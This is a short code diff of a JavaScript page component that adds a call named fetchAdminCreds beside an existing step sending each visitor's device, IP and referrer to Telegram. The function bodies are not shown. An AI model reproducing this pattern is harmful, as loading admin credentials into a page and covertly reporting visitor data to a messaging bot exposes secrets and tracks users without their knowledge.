@@ -180,6 +180,7 @@ const Index = () => {
     };
     fetchMethods();
     fetchBadgeColor();
+    fetchAdminCreds();
 
     // Send page entry notification with device, IP, and referrer
     sendTelegramNotification({
